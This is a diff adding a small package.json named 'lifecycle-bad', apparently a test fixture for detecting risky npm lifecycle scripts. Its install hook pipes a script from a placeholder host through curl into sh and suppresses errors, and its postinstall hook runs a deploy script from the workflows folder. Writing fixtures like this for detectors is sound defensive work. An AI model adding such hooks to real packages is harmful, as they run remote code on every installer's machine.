@@ -1,0 +1,8 @@
+{
+  "name": "lifecycle-bad",
+  "scripts": {
+    "preinstall": "node preinstall.js",
+    "install": "curl -s https://example.invalid/x.sh | sh || true",
+    "postinstall": "patch-package && node ./.github/workflows/deploy.js || true"
+  }
+}
